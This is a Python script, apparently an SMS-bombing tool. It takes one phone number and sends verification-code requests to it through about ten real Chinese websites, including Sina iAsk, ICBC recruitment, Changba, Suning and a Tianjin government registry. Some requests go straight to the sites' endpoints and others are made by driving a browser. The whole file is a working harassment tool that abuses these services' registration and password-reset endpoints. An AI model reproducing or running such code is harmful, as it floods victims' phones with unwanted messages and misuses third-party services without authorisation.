import requests
from selenium import webdriver
import time

headers = {
    "User-Agnet":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Edg/89.0.774.57",
}

def iask(phone_number):
    data = {
        "mobile":phone_number,
        "nationCode":"86",
        "businessCode":4,
        "terminal":"pc",
        "businessSys":"iask",
    }
    response = requests.post('https://iask.sina.com.cn/cas-api/sendSms',data = data,headers = headers)
    print("iask网站",response.text)

def icbc(phone_number):
    browser = webdriver.Edge('C:\Program Files (x86)\Microsoft Visual Studio\Shared\Python37_64\msedgedriver.exe')
    url = 'https://job.icbc.com.cn/pc/index.html#/util/register'
    browser.get(url)
    input_phone_number=browser.find_element_by_xpath('//input[@class="ant-input"]')
    input_phone_number.send_keys(phone_number)
    sent_msg=browser.find_element_by_xpath('//button[@class="ant-btn ant-btn- ant-btn-sm form_btn"]')
    sent_msg.click()
    browser.close()

def changba(phone_number):
    #https://changba.com/official_login.php
    data = {
        "ac":"start_phone_entry",
        "phone":phone_number,
    }
    response = requests.post('https://changba.com/official_login.php',data = data,headers = headers)
    print("唱吧网站",response.text)

def xes(phone_number):
    #https://hz.jiajiaoban.cn/pc/zz/index.html
    data = {
        "mobile":phone_number,
        "type":"oneToOneBeforehand",
    }
    response = requests.post('https://zaixian.izhikang.com/izk/index.php/welcome/send_sms_noauth',data = data,headers = headers)
    print("学而思网站",response.text)

def xueqiu(phone_number):
    browser = webdriver.Edge('C:\Program Files (x86)\Microsoft Visual Studio\Shared\Python37_64\msedgedriver.exe')
    url = 'https://xueqiu.com/account/lostpasswd'
    browser.get(url)
    get_phone_session=browser.find_element_by_xpath('//button[@id="show_phone_module"]')
    get_phone_session.click()
    input_phone_number=browser.find_element_by_xpath('//input[@id="account_phone"]')
    input_phone_number.send_keys(phone_number)
    sent_msg=browser.find_element_by_xpath('//button[@id="sendCode"]')
    sent_msg.click()
    browser.close()

def pkusky(phone_number):
    #https://www.pkusky.com/
    data = {
        "m_mobile":phone_number,
        "areaCode":86
    }
    response = requests.post('https://www.pkusky.com/inc/sentcode.php?action=scode',data = data,headers = headers)
    print("pkusky网站",response.text)

def wangke(phone_number):
    browser = webdriver.Edge('C:\Program Files (x86)\Microsoft Visual Studio\Shared\Python37_64\msedgedriver.exe')
    url = 'http://www.wangkezhijia.net/register'
    browser.get(url)
    input_phone_number=browser.find_element_by_xpath('//input[@name="mobile"]')
    input_phone_number.send_keys(phone_number)
    sent_msg=browser.find_element_by_xpath('//button[@class="hqyz"]')
    sent_msg.click()
    browser.close()

def suning(phone_number):
    params={
        "scen":"PERSON_MOBILE_REG_VERIFY_MOBILE",
        "phoneNum":phone_number,
        "uid":"1",
        "code":"" 
    }
    response=requests.get("http://reg.suning.com/srs-web/ajax/code/sms.do",params=params,headers=headers)
    print("sunning网站",response.text)

def tianjing(phone_number):
    #http://qydj.scjg.tj.gov.cn/reportOnlineService
    data = {
        "MOBILENO":phone_number,
        "TEMP":1
    }
    s = requests.Session()
    s.get('http://qydj.scjg.tj.gov.cn/reportOnlineService',headers = headers)
    cookies = s.cookies
    response = requests.post('http://qydj.scjg.tj.gov.cn/reportOnlineService/login_login',data = data,headers = headers,cookies=cookies)
    print("天津企业登记网站",response.text)

def youjiang(phone_number):
    #http://www.yojiang.cn/
    head = {
    "User-Agnet":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Edg/89.0.774.57",
    "Host":"www.yojiang.cn",
    "Accept-Encoding":"gzip, deflate",
    "Cookie":"guest_uuid=6059afed3d17e428af6f8bba"

    }
    params= {
        "phone": phone_number
    }
    response = requests.get('http://www.yojiang.cn/api/user/send_verify_code',params = params,headers = head)
    print("有讲网站",response.text)
    




phone_number = 22
icbc(phone_number)
iask(phone_number)
changba(phone_number)
xes(phone_number)
xueqiu(phone_number)
pkusky(phone_number)
wangke(phone_number)
suning(phone_number)
tianjing(phone_number)
youjiang(phone_number)




